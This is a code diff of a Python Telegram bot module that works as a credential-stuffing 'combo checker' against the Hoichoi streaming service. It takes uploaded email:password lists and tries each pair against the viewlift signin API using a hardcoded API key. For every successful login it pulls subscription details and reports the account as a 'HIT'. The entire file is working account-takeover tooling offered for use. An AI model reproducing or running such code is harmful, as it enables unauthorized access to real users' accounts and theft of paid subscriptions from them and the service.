@@ -1,119 +1,58 @@
 import requests
 import time
-import json
-import random
-import string
-import urllib3
 from telebot import types
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-hits = []
-dead = []
-cancel_check = False
+hit_combos = []
+dead_combos = []
 
 def process_hoitxt_command(bot, message):
-    bot.send_message(message.chat.id, "Please send your txt file with combo data.")
+    global hit_combos, dead_combos
+    chat_id = message.chat.id
 
-def handle_hoitxt_docs(bot, message):
-    global cancel_check
-    cancel_check = False
-    try:
-        file_info = bot.get_file(message.document.file_id)
-        downloaded_file = bot.download_file(file_info.file_path)
+    if not message.document:
+        bot.send_message(chat_id, "Please upload a .txt file containing email:password combos.")
+        return
 
-        with open('combo_data.txt', 'wb') as new_file:
-            new_file.write(downloaded_file)
+    file_info = bot.get_file(message.document.file_id)
+    downloaded_file = bot.download_file(file_info.file_path)
+    combo_text = downloaded_file.decode("utf-8")
+    combos = combo_text.splitlines()
 
-        with open('combo_data.txt', 'r') as file:
-            combo_list = file.readlines()
+    total_accounts = len(combos)
+    start_time = time.time()
+    hits = 0
+    dead = 0
+    hit_combos = []
+    dead_combos = []
 
-        total_combos = len(combo_list)
-        start_time = time.time()
+    inline_keyboard = types.InlineKeyboardMarkup()
+    inline_keyboard.add(types.InlineKeyboardButton("HIT ✅", callback_data="hoitxt_hit"))
+    inline_keyboard.add(types.InlineKeyboardButton("Dead ❌", callback_data="hoitxt_dead"))
+    inline_keyboard.add(types.InlineKeyboardButton("Cancel ❌", callback_data="hoitxt_cancel"))
 
-        # Creating inline keyboard for showing results and cancel button
-        keyboard = types.InlineKeyboardMarkup(row_width=1)
-        keyboard.add(
-            types.InlineKeyboardButton(text="HIT ✅", callback_data='hit_hoitxt'),
-            types.InlineKeyboardButton(text="Dead ❌", callback_data='dead_hoitxt'),
-            types.InlineKeyboardButton(text="Cancel ❌", callback_data='cancel_hoitxt')
+    initial_message = "↯ HOI COMBO CHECKER\n\nCombo checking:\n"
+    msg = bot.send_message(chat_id, initial_message + "Waiting for first combo..." + "\n\n" + get_footer_info(total_accounts, hits, dead, start_time, message.from_user.username), reply_markup=inline_keyboard)
+
+    for combo in combos:
+        result = check_hoi_account(combo)
+        if "HIT SUCCESSFULLY" in result:
+            hits += 1
+            hit_combos.append((combo, result))
+        else:
+            dead += 1
+            dead_combos.append(combo)
+
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=msg.message_id,
+            text=initial_message + f"{combo}\n\n" + get_footer_info(total_accounts, hits, dead, start_time, message.from_user.username),
+            reply_markup=inline_keyboard
         )
+        time.sleep(1)  # Add delay to simulate processing time
 
-        initial_message = (
-            f"↯ HOI COMBO CHECKER\n\n"
-            f"COMBO CHECKING:\n"
-            f"• HIT ✅: [0] •\n"
-            f"• Dead ❌: [0] •\n"
-            f"• TOTAL: [{total_combos}] •\n"
-            f"－－－－－－－－－－－－－－－－\n"
-            f"⚫️ Total Combos - {total_combos}\n"
-            f"⏱️ Time Taken - 0.00 seconds\n"
-            f"▫️ Checked by: {message.from_user.username}\n"
-            f"⚡️ Bot by - AFTAB 👑\n"
-            f"－－－－－－－－－－－－－－－－"
-        )
-
-        msg = bot.send_message(message.chat.id, initial_message, reply_markup=keyboard)
-
-        hits = []
-        dead = []
-
-        for combo in combo_list:
-            if cancel_check:
-                break
-            if ':' in combo:
-                user, pwd = combo.strip().split(':', 1)
-                result = check_hoitxt_combo(user, pwd)
-                if "HIT" in result:
-                    hits.append((combo.strip(), result))
-                else:
-                    dead.append((combo.strip(), result))
-
-                current_message = (
-                    f"↯ HOI COMBO CHECKER\n\n"
-                    f"COMBO CHECKING:\n{combo.strip()}\n\n"
-                    f"• HIT ✅: [{len(hits)}] •\n"
-                    f"• Dead ❌: [{len(dead)}] •\n"
-                    f"• TOTAL: [{total_combos}] •\n"
-                    f"－－－－－－－－－－－－－－－－\n"
-                    f"⚫️ Total Combos - {total_combos}\n"
-                    f"⏱️ Time Taken - {time.time() - start_time:.2f} seconds\n"
-                    f"▫️ Checked by: {message.from_user.username}\n"
-                    f"⚡️ Bot by - AFTAB 👑\n"
-                    f"－－－－－－－－－－－－－－－－"
-                )
-                # Adding a unique timestamp to ensure the message content is always different
-                current_message += f"\nLast checked at: {time.time()}"
-                bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
-            else:
-                dead.append((combo.strip(), "Invalid format"))
-
-        bot.edit_message_text(current_message, chat_id=msg.chat.id, message_id=msg.message_id, reply_markup=keyboard)
-
-    except Exception as e:
-        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")
-
-def handle_hoitxt_callback_query(call, bot):
-    global cancel_check
-    if call.data == 'hit_hoitxt':
-        send_combos(call.message.chat.id, hits, bot, "HIT ✅ Combos")
-    elif call.data == 'dead_hoitxt':
-        send_combos(call.message.chat.id, dead, bot, "Dead ❌ Combos")
-    elif call.data == 'cancel_hoitxt':
-        cancel_check = True
-        bot.send_message(call.message.chat.id, "Process has been canceled.")
-
-def send_combos(chat_id, combos, bot, title):
-    if combos:
-        combo_list = "\n".join([f"Combo: {combo}\nResult => {result}" for combo, result in combos])
-        bot.send_message(chat_id, f"{title}\n\n{combo_list}")
-    else:
-        bot.send_message(chat_id, f"No {title} found.")
-
-def check_hoitxt_combo(user, pwd):
-    session = requests.Session()
-    user_agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
-
+def check_hoi_account(account):
+    email, password = account.split(':')
+    login_url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-364a8001-dbe1-2d16-ddde-33429eb8474c"
     headers = {
         "scheme": "https",
         "accept": "application/json, text/plain, */*",
@@ -123,55 +62,97 @@ def check_hoitxt_combo(user, pwd):
         "content-type": "application/json;charset=UTF-8",
         "origin": "https://www.hoichoi.tv",
         "referer": "https://www.hoichoi.tv/",
-        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
+        "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
         "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": "\"Windows\"",
+        "sec-ch-ua-platform": '"Windows"',
         "sec-fetch-dest": "empty",
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "cross-site",
-        "user-agent": user_agent,
+        "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
+        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
+    }
+    data = {
+        "email": email,
+        "password": password
+    }
+
+    response = requests.post(login_url, headers=headers, json=data)
+    response_data = response.json()
+
+    if "error" in response_data:
+        error_message = response_data["error"]
+        if "Sorry, we can't find an account with this email address." in error_message:
+            return "Email Not Registered❌"
+        elif "Your email or password is incorrect, please try again." in error_message:
+            return "EMAIL OR PASSWORD INCORRECT❌"
+        else:
+            return f"Unexpected error: {error_message}"
+    elif "authorizationToken" in response_data:
+        auth_token = response_data["authorizationToken"]
+        return check_subscription(auth_token)
+    else:
+        return "Unexpected error occurred❌"
+
+def check_subscription(auth_token):
+    subscription_url = "https://prod-api.viewlift.com/payments/billing-history?site=hoichoitv"
+    headers = {
+        "scheme": "https",
+        "accept": "application/json, text/plain, */*",
+        "accept-encoding": "gzip, deflate, br",
+        "accept-language": "en-US,en;q=0.9",
+        "authorization": auth_token,
+        "referer": "https://www.hoichoi.tv/",
+        "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "cross-site",
+        "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
         "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
     }
 
-    data = json.dumps({"email": user, "password": pwd})
-    response = session.post("https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-364a8001-dbe1-2d16-ddde-33429eb8474c", headers=headers, data=data)
-    
-    if response.status_code == 200 and "authorizationToken" in response.text:
-        auth_token = response.json().get("authorizationToken")
-        headers["authorization"] = auth_token
-        
-        response = session.get("https://prod-api.viewlift.com/payments/billing-history?site=hoichoitv", headers=headers)
-        
-        if "subscriptionStatus" in response.text:
-            subscription_info_url = "https://prod-api.viewlift.com/payments/subscription-info?site=hoichoitv"
-            subscription_info_headers = headers.copy()
-            subscription_info_response = requests.get(subscription_info_url, headers=subscription_info_headers)
-            subscription_info_data = subscription_info_response.json()
+    response = requests.get(subscription_url, headers=headers)
+    response_data = response.json()
 
-            subscription_name = subscription_info_data.get('sku', 'Subscription Not Found')
-            currency = subscription_info_data.get('currency_code', 'N/A')
-            subscription_amount = subscription_info_data.get('amount', 'N/A')
-
-            return (f"HIT SUCCESSFULLY✅\n"
-                    f"Subscription Name: {subscription_name}\n"
-                    f"Currency: {currency}\n"
-                    f"Subscription Amount: {subscription_amount}")
-        else:
-            return "Dead"
+    if "subscriptionStatus" in response_data and "subscriptionEndDate" in response_data:
+        subscription_status = response_data["subscriptionStatus"]
+        subscription_end_date = response_data["subscriptionEndDate"].split("T")[0]
+        return f"HIT SUCCESSFULLY✅\nSubscription Status: {subscription_status}\nSubscription End Date: {subscription_end_date}"
     else:
-        return "Dead"
+        return "HIT SUCCESSFULLY✅\nSubscription Status: Unknown\nSubscription End Date: Unknown"
 
-def random_string():
-    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-
-def get_footer_info(total_combos, start_time, username):
+def get_footer_info(total_accounts, hits, dead, start_time, username):
     elapsed_time = time.time() - start_time
     footer = (
         f"－－－－－－－－－－－－－－－－\n"
-        f"⚫️ Total Combos - {total_combos}\n"
-        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
-        f"▫️ Checked by: {username}\n"
+        f"• Total Combos - {total_accounts}\n"
+        f"• Hits ✅ - {hits}\n"
+        f"• Dead ❌ - {dead}\n"
+        f"• Time Taken - {elapsed_time:.2f} seconds\n"
+        f"• Checked by: {username}\n"
         f"⚡️ Bot by - AFTAB 👑\n"
         f"－－－－－－－－－－－－－－－－"
     )
     return footer
+
+def handle_callback_query(bot, call):
+    global hit_combos, dead_combos
+    if call.data == "hoitxt_hit":
+        if hit_combos:
+            hit_message = "Hit Results:\n\n" + "\n\n".join([f"Combo: {combo}\n{details}" for combo, details in hit_combos])
+        else:
+            hit_message = "No hits found."
+        bot.send_message(call.message.chat.id, hit_message)
+    elif call.data == "hoitxt_dead":
+        if dead_combos:
+            dead_message = "Dead Results:\n\n" + "\n".join(dead_combos)
+        else:
+            dead_message = "No dead combos found."
+        bot.send_message(call.message.chat.id, dead_message)
+    elif call.data == "hoitxt_cancel":
+        bot.send_message(call.message.chat.id, "Process stopped.")
+
+# Add these handlers to your bot
+bot.register_message_handler(process_hoitxt_command, commands=['hoitxt'])
+bot.register_callback_query_handler(handle_callback_query)
